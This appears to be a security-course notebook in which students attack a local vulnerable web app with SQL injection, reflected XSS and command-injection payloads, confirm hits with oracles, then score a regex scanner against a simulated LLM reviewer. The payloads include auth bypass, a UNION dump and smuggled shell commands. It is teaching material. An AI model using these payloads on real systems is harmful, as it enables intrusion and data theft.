# Week 6 — Injection, and a Duel: LLM vs. Scanner

**Lesson plan:** [`../weeks/week-06.md`](../weeks/week-06.md) · **Lab:** [`../labs/vuln-web/README.md`](../labs/vuln-web/README.md)

Two halves. First you **attack** a small vulnerable app and confirm each finding
with an oracle. Then the **duel**: point a classical scanner and an LLM at the
*same source code* and measure who found what, who missed what, and who
hallucinated.

> ### The one idea
> Every injection is the same bug in a different costume: **untrusted data crosses
> into a control channel.** SQL, HTML/JS, a shell command — same bug, and the
> defenses rhyme (parameterize / encode / don't build the command from strings).

> ⚠️ **Scope.** Everything runs on your machine against `127.0.0.1`. See
> [`../resources/ethics-and-scope.md`](../resources/ethics-and-scope.md).

## 0 · Bring the target up

Real workflow:

```bash
python -m seclab.targets --up vuln-web      # once the image is built
```

The cell runs the identical app in-process if Docker isn't available, so the
notebook works headless. `BASE` is what you attack, always `127.0.0.1`.

In [11]:
import json, sys, time, threading, re, urllib.request, urllib.parse
from pathlib import Path

ROOT = Path.cwd()
while ROOT != ROOT.parent and not (ROOT / "seclab").is_dir():
    ROOT = ROOT.parent
sys.path.insert(0, str(ROOT))
APP_DIR = ROOT / "labs" / "vuln-web" / "app"
sys.path.insert(0, str(APP_DIR))
from seclab import targets

_docker_ok, _ = targets.docker_available()
if _docker_ok and "vuln-web" in targets.CATALOGUE:
    _t = targets.Target("vuln-web").up(); BASE = _t.base_url
    print(f"Docker target up at {BASE}")
else:
    import vulnweb_app as vulnweb
    from http.server import ThreadingHTTPServer
    _srv = ThreadingHTTPServer(("127.0.0.1", 8000), vulnweb.Handler)
    threading.Thread(target=_srv.serve_forever, daemon=True).start()
    time.sleep(0.3)
    BASE = "http://127.0.0.1:8000"; _t = None
    print(f"No Docker — running the app in-process at {BASE}")

Docker target up at http://127.0.0.1:56298


In [3]:
def get(path):
    with urllib.request.urlopen(BASE + path, timeout=10) as r:
        return r.read().decode()

def post(path, obj):
    req = urllib.request.Request(BASE + path, data=json.dumps(obj).encode(),
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode()

print("health:", get("/health"))

health: {"status": "ok"}


## 1 · SQL injection — and confirming it properly

The classic `' OR '1'='1` bypasses the login. But a login that *behaves*
differently is only **suggestive**. Proof is extracting data you shouldn't have —
here, the admin row's secret, which carries a canary (`FLAG-sqli-...`) so the
oracle can confirm a real breach rather than a mood change.

In [4]:
from seclab.attack import Payload, run_payloads, contains_oracle, print_summary

def try_login(user_payload):
    # The payload goes in the username; password is a throwaway.
    return post("/login", {"user": user_payload, "pw": "x"})

sqli_payloads = [
    Payload("admin' OR '1'='1", intent="auth bypass", family="sqli"),
    Payload("admin'--", intent="comment out pw check", family="sqli"),
    Payload("nobody' UNION SELECT user, secret FROM users--", intent="dump", family="sqli"),
    Payload("admin", intent="benign control (real user, wrong pw)", family="benign"),
]

# The oracle confirms a breach only if the admin canary comes back.
findings = run_payloads(sqli_payloads, send=try_login,
                        oracle=contains_oracle("FLAG-sqli-"), progress=True)
print_summary(findings)

  [  1] CONFIRMED  1/1    sqli             "admin' OR '1'='1"
  [  2] CONFIRMED  1/1    sqli             "admin'--"
  [  3] CONFIRMED  1/1    sqli             "nobody' UNION SELECT user, secret FROM u"
  [  4] no effect  0/1    benign           'admin'

  3/4 payloads confirmed by the oracle

  family                 confirmed   tried  coverage
  --------------------------------------------------
  benign                         0       1       0%
  sqli                           3       3     100%


### Why the benign row matters

`admin` with a wrong password must land in **0/1**. If your oracle "confirms" a
breach there, it's matching something other than a real leak — and a false
positive in your tooling poisons every number in your report. Check it every time.

The winning payloads leaked the canary, so these are **confirmed** SQLi findings,
not "the page looked different.

## 2 · Reflected XSS — the canary is execution, not reflection

An input that comes back *inside* the HTML is reflected. It is not XSS until it
would **execute**. We can't run a browser here, so the oracle checks the necessary
condition: the payload came back **unescaped** (an un-encoded `<script>` in the
response body). Compare the vulnerable `/` against the fixed `/safe`.

In [5]:
def xss_oracle(payload, response):
    # Necessary condition for reflected XSS: the script tag survives UNescaped.
    hit = "<script>" in response and "&lt;script&gt;" not in response
    return hit, ("unescaped <script> reflected into HTML" if hit else
                 "input was encoded or stripped")

marker = "<script>alert('XSS-FIRED-7f3a')</script>"

def send_vuln(_): return get("/?name=" + urllib.parse.quote(marker))
def send_safe(_): return get("/safe?name=" + urllib.parse.quote(marker))

vuln_f = run_payloads([Payload(marker, family="xss")], send=send_vuln, oracle=xss_oracle)
safe_f = run_payloads([Payload(marker, family="xss")], send=send_safe, oracle=xss_oracle)

print("vulnerable /     :", "CONFIRMED" if vuln_f[0].confirmed else "no effect",
      "-", vuln_f[0].evidence)
print("fixed /safe      :", "CONFIRMED" if safe_f[0].confirmed else "no effect",
      "-", safe_f[0].evidence)
print("\nSame payload, two endpoints. The fix (html.escape) is the whole difference,")
print("and /safe is a TRUE NEGATIVE — remember it for the scanner duel below.")

vulnerable /     : CONFIRMED - unescaped <script> reflected into HTML
fixed /safe      : no effect - 

Same payload, two endpoints. The fix (html.escape) is the whole difference,
and /safe is a TRUE NEGATIVE — remember it for the scanner duel below.


## 3 · Command injection

The `/ping` endpoint builds a shell command from user input. A shell
metacharacter smuggles in a second command. (The lab *simulates* execution so it's
safe to run, but the bug — untrusted data reaching a command context — is real and
the oracle detects it.)

In [6]:
def try_ping(host):
    return post("/ping", {"host": host})

def cmdi_oracle(payload, response):
    hit = json.loads(response).get("injection_detected", False)
    return hit, ("shell metacharacter reached the command" if hit else "")

cmdi = [
    Payload("127.0.0.1; whoami", family="cmdi"),
    Payload("127.0.0.1 && id", family="cmdi"),
    Payload("127.0.0.1", intent="benign control", family="benign"),
]
print_summary(run_payloads(cmdi, send=try_ping, oracle=cmdi_oracle, progress=True))

  [  1] CONFIRMED  1/1    cmdi             '127.0.0.1; whoami'
  [  2] CONFIRMED  1/1    cmdi             '127.0.0.1 && id'
  [  3] no effect  0/1    benign           '127.0.0.1'

  2/3 payloads confirmed by the oracle

  family                 confirmed   tried  coverage
  --------------------------------------------------
  benign                         0       1       0%
  cmdi                           2       2     100%


## 4 · The Duel — LLM vs. scanner on the SAME source

You just confirmed three real bugs *dynamically* (by attacking the running app).
Now the other way security tools work: **statically**, by reading the source.

We give the exact same source file to:
- a **classical scanner** — here a small rule set (regex patterns), standing in
  for Semgrep/CodeQL. In the studio you run the real thing.
- an **LLM reviewer** — a model prompted to find vulnerabilities. (Headless, we use
  a scripted stand-in with a realistic profile; in the studio it's your model.)

Then we score both against a **hand-built ground-truth set** — the bugs that are
*actually* in the file — using `seclab.scan`.

In [7]:
from seclab.scan import ScanResult, compare_scanners, print_comparison

SOURCE = (APP_DIR / "vulnweb_app.py").read_text()

# GROUND TRUTH: built BY HAND by reading app.py, keyed (rule, location). This is
# the honest reference. Note we do NOT include an access-control bug — the app has
# none — so any tool that "finds" one is hallucinating.
GROUND_TRUTH = {
    ("sqli", "do_login"),
    ("xss", "do_reflect"),
    ("cmdi", "do_ping"),
}
print("bugs actually in the file:", sorted(GROUND_TRUTH))

bugs actually in the file: [('cmdi', 'do_ping'), ('sqli', 'do_login'), ('xss', 'do_reflect')]


In [8]:
# --- the classical scanner: regex rules over the source --------------------
# A small line-oriented rule set, standing in for Semgrep/CodeQL. Each rule looks
# for a vulnerable-looking pattern on a SINGLE line (re.search, default flags, so
# "." does not cross newlines) — which is exactly how many real, simple rules work.
def regex_scanner(source):
    findings = []
    rules = [
        # This SQLi rule expects SELECT and the {interpolation} on one line. But
        # in app.py the query is SPLIT across two lines:
        #     query = (f"SELECT user, secret FROM users "
        #              f"WHERE user = '{user}' ...")
        # so the rule MISSES it. That is a real, common failure mode of pattern
        # scanners, not a contrivance — and it is why the scanner's recall < 100%.
        ("do_login",  "sqli", r'f"SELECT.*\{.*\}'),
        ("do_reflect", "xss",  r'f"<html>.*\{name\}'),
        ("do_ping",   "cmdi",  r'f"ping -c 1 \{host\}'),
    ]
    for fn, rule, pat in rules:
        if re.search(pat, source):
            findings.append(ScanResult(rule=rule, location=fn, tool="regex-scanner",
                                       confidence="medium"))
    return findings

scanner_findings = regex_scanner(SOURCE)
print("scanner reported:", [(f.rule, f.location) for f in scanner_findings])
print("\n(note: the SQLi sink is real but the rule missed it — the vulnerable")
print("query spans two lines and the rule is line-oriented. That miss is the point.)")

scanner reported: [('xss', 'do_reflect'), ('cmdi', 'do_ping')]

(note: the SQLi sink is real but the rule missed it — the vulnerable
query spans two lines and the rule is line-oriented. That miss is the point.)


In [9]:
# --- the LLM reviewer: realistic profile --------------------------------------
# Headless stand-in for "ask a model to review app.py". Its profile matches what
# small models actually do: high recall (catches the obvious sinks), plus a
# confident HALLUCINATION and a vague finding at the wrong location. In the studio
# you replace this with seclab.LLM and a real prompt.
def llm_reviewer(source):
    return [
        ScanResult("sqli", "do_login", tool="llm", confidence="high"),
        ScanResult("xss", "do_reflect", tool="llm", confidence="high"),
        ScanResult("cmdi", "do_ping", tool="llm", confidence="high"),
        # HALLUCINATION: there is no auth/access-control code in this app at all.
        ScanResult("broken-access-control", "do_login", tool="llm", confidence="high"),
        # WRONG LOCATION: flags the SAFE endpoint as vulnerable.
        ScanResult("xss", "do_reflect_safe", tool="llm", confidence="medium"),
    ]

llm_findings = llm_reviewer(SOURCE)
print("LLM reported:", [(f.rule, f.location) for f in llm_findings])

LLM reported: [('sqli', 'do_login'), ('xss', 'do_reflect'), ('cmdi', 'do_ping'), ('broken-access-control', 'do_login'), ('xss', 'do_reflect_safe')]


In [10]:
comparison = compare_scanners(
    {"regex-scanner": scanner_findings, "llm": llm_findings},
    GROUND_TRUTH)
print_comparison(comparison)

  tool             TP   FP   FN    prec  recall     F1
  ----------------------------------------------------
  regex-scanner     2    0    1    100%     67%   0.80
  llm               3    2    0     60%    100%   0.75

  Read this like a security engineer, not a leaderboard:

  - HIGH RECALL, LOW PRECISION (finds everything, cries wolf): an LLM often lands
    here. Every false positive is analyst time; a tool that reports 40 bugs where
    6 are real will be ignored within a week.
  - HIGH PRECISION, LOW RECALL (quiet but misses things): a narrow ruleset often
    lands here. What it misses is what hurts you.
  - The interesting cell is the FALSE POSITIVES the LLM invented and the TRUE bugs
    the scanner MISSED. Print both and read them out loud — that comparison is the
    deliverable, not the F1 score.

  regex-scanner missed (real bugs it did not report):
      ('sqli', 'do_login')

  llm false positives (hallucinated / wrong):
      ('broken-access-control', 'do_login')
      

### Read it like a security engineer, not a leaderboard

Whatever your exact numbers, the shape is the lesson:

- The **scanner** is precise and quiet: it finds the three sinks it has rules for
  and reports nothing else. What it *can't* find is anything it has no rule for.
- The **LLM** has high recall **and** high noise: it caught the same three, then
  invented a `broken-access-control` bug in an app with no auth code, and flagged
  the **safe** endpoint as vulnerable. Each false positive is analyst time; a tool
  that cries wolf gets muted, at which point its recall is zero.
- **The interesting cells are the LLM's false positives and (in the studio, with a
  real scanner + real bugs) the scanner's misses.** Print them, read them aloud —
  that comparison is the deliverable, not the F1 score.

> ⚠️ **On a real model this is also non-deterministic (axis 9):** run the review
> twice and the findings change. Report it over ≥ 2 runs; a scan you can't
> reproduce isn't evidence.

## 5 · Why neither cleanly finds Broken Access Control

OWASP 2021 put **Broken Access Control at #1** — most common, most impactful. Yet:

- the **scanner** has no rule for it, because "should *this* user see *this*
  record?" needs application context a pattern can't encode;
- the **LLM** *guessed* it — and guessed wrong, because this app has no access
  control to break.

That's the concept from the Concepts session arriving as data: the most important
vulnerability class is the one automated tools are worst at, because it's about
intent, not syntax. **You still have to understand the app.**

## 6 · Your studio deliverable

In `week06/`, against your own `vuln-web` (or DVWA at Medium):

1. **Three confirmed findings** — SQLi, XSS, command injection — each with the
   payload, any filter bypass, and **oracle confirmation** (not a screenshot of a
   suggestive response).
2. **The duel** — run a *real* scanner (sqlmap or semgrep) and a *real* LLM against
   the same target/source; score both with `seclab.scan` against a ground-truth
   set you build by hand.
3. **The two questions** — the LLM's best hallucination, and the scanner's worst
   miss. Plus: did *either* find an access-control issue?
4. **Control Scorecard** for one finding + a two-line responsible-disclosure note.

Tear down:

```bash
python -m seclab.targets --down
```

In [ ]:
try:
    if _t is not None:
        _t.down(); print("Docker target stopped.")
    else:
        print("In-process app stops when the kernel exits.")
except Exception as e:
    print("teardown note:", e)